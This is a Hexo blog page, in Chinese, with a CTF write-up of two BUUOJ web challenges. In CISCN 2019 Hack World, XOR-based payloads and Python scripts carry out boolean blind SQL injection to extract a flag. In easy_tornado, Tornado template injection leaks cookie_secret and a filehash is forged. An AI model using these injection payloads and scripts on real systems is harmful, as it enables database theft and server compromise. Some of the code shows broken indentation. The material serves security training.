@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>buuoj Hack World  easy_tornado | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="CISCN 2019 web Hack World 进入页面，就有提示让我们传参数id就行。说明这是sql注入中的数字注入给id传整数。  再传一个空值，页面显示”bool(false)”。  可以联想到布尔型注入，试试用布尔盲注的方法先测试一下，发现union，or，and这些被过滤了,就连空格也被过滤了。不过（）倒是没有被过滤。那么怎么表达逻辑运算？上网搜了一下，发现可以用异或运算符”^”来代">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuoj Hack World  easy_tornado">
+<meta property="og:url" content="http://yoursite.com/2020/03/15/buuoj-Hack-World-easy-tornado/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="CISCN 2019 web Hack World 进入页面，就有提示让我们传参数id就行。说明这是sql注入中的数字注入给id传整数。  再传一个空值，页面显示”bool(false)”。  可以联想到布尔型注入，试试用布尔盲注的方法先测试一下，发现union，or，and这些被过滤了,就连空格也被过滤了。不过（）倒是没有被过滤。那么怎么表达逻辑运算？上网搜了一下，发现可以用异或运算符”^”来代">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200315163401714.JPG">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200315163433120.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200315163623138.JPG">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200315163543953.JPG">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200315163613951.JPG">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200315163636990.JPG">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200315164940300.JPG">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200315163734295.JPG">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200315163743169.JPG">
+<meta property="og:updated_time" content="2020-03-15T09:00:54.729Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="buuoj Hack World  easy_tornado">
+<meta name="twitter:description" content="CISCN 2019 web Hack World 进入页面，就有提示让我们传参数id就行。说明这是sql注入中的数字注入给id传整数。  再传一个空值，页面显示”bool(false)”。  可以联想到布尔型注入，试试用布尔盲注的方法先测试一下，发现union，or，and这些被过滤了,就连空格也被过滤了。不过（）倒是没有被过滤。那么怎么表达逻辑运算？上网搜了一下，发现可以用异或运算符”^”来代">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200315163401714.JPG">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-buuoj-Hack-World-easy-tornado" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/15/buuoj-Hack-World-easy-tornado/" class="article-date">
+  <time datetime="2020-03-15T08:58:45.000Z" itemprop="datePublished">2020-03-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      buuoj Hack World  easy_tornado
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CISCN-2019-web-Hack-World"><a href="#CISCN-2019-web-Hack-World" class="headerlink" title="CISCN 2019 web Hack World"></a>CISCN 2019 web Hack World</h1><hr>
+<p>进入页面，就有提示让我们传参数id就行。说明这是sql注入中的数字注入给id传整数。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163401714.JPG" alt></p>
+<p>再传一个空值，页面显示”bool(false)”。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163433120.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
+<p>可以联想到布尔型注入，试试用布尔盲注的方法先测试一下，发现union，or，and这些被过滤了,就连空格也被过滤了。不过（）倒是没有被过滤。那么怎么表达逻辑运算？上网搜了一下，发现可以用异或运算符”^”来代替and和or。这里只借助”^”貌似还不够。还要借助sql语句中的if和”%”通配符。</p>
+<p>sql语句中的if有点类似于c语言中的三元运算符。比如if(语句，0，1)如果语句成立的话，就是0。否则就是1。%则是匹配语句。通过利用这些绕过技巧，就可以成功注入。</p>
+<p>下面就是思考如何构造payload。布尔型盲注常用的几个函数left(),ascii(),substr()都可以试一下。但是用ascii()相对来说方便一些。</p>
+<p>构造的payload    <code>&quot;1^if(ascii(substr((select(flag)from(flag)),%d,1)=%d),0,1)&quot;%(num1,num2)</code></p>
+<p>显然，这个payload需要很多次运算。用脚本的话会快得多。</p>
+<pre><code>import requests
+flag=&quot;&quot;
+url=&quot;http://da187932-a027-4cc7-bf31-b5913a3e4a85.node3.buuoj.cn/index.php&quot;
+for i in range(1,60):
+for j in range(32, 129):
+    payload = &quot;1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))&quot; % (i, j)
+    data = {
+        &apos;id&apos;: payload
+    }
+    res = requests.post(url, data=data)
+    if &apos;Hello&apos; in res.text:
+        flag = flag + chr(j)
+        print(flag)
+        link = 1
+        break</code></pre><p>这个脚本运行起来有点慢。在网上发现了大佬的脚本，用二分法写的。运行起来要快了不少。</p>
+<pre><code>import requests
+import time
+
+url = &quot;http://da187932-a027-4cc7-bf31-b5913a3e4a85.node3.buuoj.cn/index.php&quot;
+temp = {&quot;id&quot; : &quot;&quot;}
+flag = &quot;&quot;
+for i in range(1,1000):
+    time.sleep(0.06)
+    low = 32
+       high =128
+    mid = (low+high)//2
+    while(low&lt;high):
+       temp[&quot;id&quot;] = &quot;1^&quot; + &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)^1&quot; %(i,mid)
+       r = requests.post(url,data=temp)
+       print(low,high,mid,&quot;:&quot;)
+       if &quot;Hello&quot; in r.text:
+          low = mid+1
+       else:
+          high = mid
+       mid =(low+high)//2
+    if(mid ==32 or mid ==127):
+        break
+   flag +=chr(mid)
+   print(flag)
+
+
+print(&quot;flag=&quot; ,flag)</code></pre><p>得出来flag，提交。</p>
+<p>#护网杯2018 Easy_tornado</p>
+<hr>
+<p>打开实例，发现页面给了三个文件地址。打开看看有什么信息。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163623138.JPG" alt></p>
+<p>发现flag.txt下提示flag就在/fllllllllllllag里面。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163543953.JPG" alt></p>
+<p>再打开hints.txt,看看有什么提示信息。页面提示”<code>md5(cookie_secret+md5(filename))</code>“。再看看url，发现有一个参数”filehash”。再结合MD5这个提示，说明这个参数可能就是md5(cookie_secret+md5(filename))后的结果。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163613951.JPG" alt></p>
+<p>打开welcome.txt,发现提示”render”。一开始不明白这什么意思，在网上看了wp才发现这是提示模板注入。题名tornado也说明可能和t模板注入有关。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163636990.JPG" alt></p>
+<p><strong>什么是模板注入？</strong></p>
+<p>模板注入（SSTI）和sql注入有点类似，也是通过输入在后端的渲染处理上拼接成语句。ssti和常见到的web注入一样，都是服务端接受了用户的输入，将其作为web模板的一部分。在进行模板渲染的过程中执行了用户插入的恶意内容。</p>
+<p>模板注入是基于模板渲染处理的，模板渲染又分为前端渲染，后端渲染，浏览器渲染。这里给出一个ssti的例子：</p>
+<pre><code>$output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); 
+echo $output;</code></pre><p>这样可以通过用户传的参数name来实现模板注入。利用模板变量来实现页面执行用户输入的恶意代码。(使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于 GET 请求参数 $_GET[“name”]。)</p>
+<p>这样可以考虑构造payload     <code>file?filename=/flllllllllllag&amp;filehash=mad5(cookie_secret+md5(/flllllllllllllag))</code> 但是<code>cookie_secret</code>怎么获取？这是就要用到tornado模板。和sql注入一样,ssti注入也需要先找一下注入点.</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315164940300.JPG" alt></p>
+<p>直接输入filename=/flllllllllag,页面会报错。并且浏览器上的url显示error?msg=Error.说明可以构造error?msg=  先试试error?msg=2,只输出了2。在试试error?msg=6,没有出现cookie。说明这些操作符被过滤了，这个时候要用到tornado中的handler.settings对象。构造error?msg=,页面显示cookie_secret。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163734295.JPG" alt></p>
+<p>再把cookie_secret代入到payload中，得到flag。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200315163743169.JPG" alt></p>
+<p>当然也可以写个脚本，菜鸟在网上找了一个脚本，但运行时报错。提示TypeError: Unicode-objects must be encoded before hashing。当时想那个地方可能没有指定编码格式。确实，在update函数要指定传入的参数的编码格式。</p>
+<pre><code>#!-*-coding:utf-8 -*-
+import hashlib
+def md5(s):
+    md5 = hashlib.md5()
+    md5.update(s.encode(&quot;utf-8&quot;))
+    return md5.hexdigest()
+def filehash():
+    filename = &apos;/fllllllllllllag&apos;
+    cookie_secret = &apos;c6862c2d-66a0-4465-af17-58a23841583b&apos;
+    print(md5(cookie_secret + md5(filename)))
+if __name__ == &apos;__main__&apos;:
+    filehash()</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/03/15/buuoj-Hack-World-easy-tornado/" data-id="ck7st7j9t0001iwv9f7802edt" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/03/10/leetcode-dynamic-programming-2/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">leetcode-dynamic programming-2</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/03/15/buuoj-Hack-World-easy-tornado/">buuoj Hack World  easy_tornado</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/10/leetcode-dynamic-programming-2/">leetcode-dynamic programming-2</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/08/leetcode-动态规划-2/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/02/29/Metasploit学习笔记/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/02/25/leetcode-动态规划-1/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
